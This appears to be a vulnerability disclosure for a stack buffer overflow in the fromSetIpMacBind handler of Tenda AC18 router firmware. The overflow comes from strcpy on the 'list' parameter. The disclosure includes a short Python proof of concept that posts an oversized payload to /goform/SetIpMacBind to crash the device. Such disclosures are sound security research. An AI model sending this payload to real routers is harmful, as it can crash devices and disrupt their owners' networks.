# Sorry, the vulnerability function is FromSetIpMacBind. The submitted vulnerability description is slightly wrong. The following description shall prevail.

# Tenda AC18 V15.03.05.19 (6318) firmware has a buffer overflow vulnerability through the "fromSetIpMacBind" function.


 Vulnerability description:
 
The "FromSetIpMacBind" function of Tenda router (tendaAc18V15030519(6318)) has a high-risk stack buffer overflow vulnerability. The vulnerability is caused by the program using "Strcpy" to copy the user-controllable "List" parameter to a fixed stack buffer.

<img width="1625" height="774" alt="image" src="https://github.com/user-attachments/assets/3ed962cd-4262-4108-9967-5b5234ee8ab3" />


exp:

```
import requests

def test_ac18_overflow(url):
    payload = b'A' * 512 
    
    params = {
        'bindnum': '1',
        'list': payload 
    }
    cookie = {'password': 'your_password'} 
    
    try:
        response = requests.post(url, cookies=cookie, data=params, timeout=5)
        print("Status:", response.status_code)
    except requests.exceptions.ConnectionError:
        print("Target crashed! (Potential vulnerability confirmed)")

url = "http://192.168.0.3/goform/SetIpMacBind"
test_ac18_overflow(url)
```

<img width="2122" height="875" alt="image" src="https://github.com/user-attachments/assets/63b9d635-98b7-48b4-a4a8-cc70d1bb8105" />









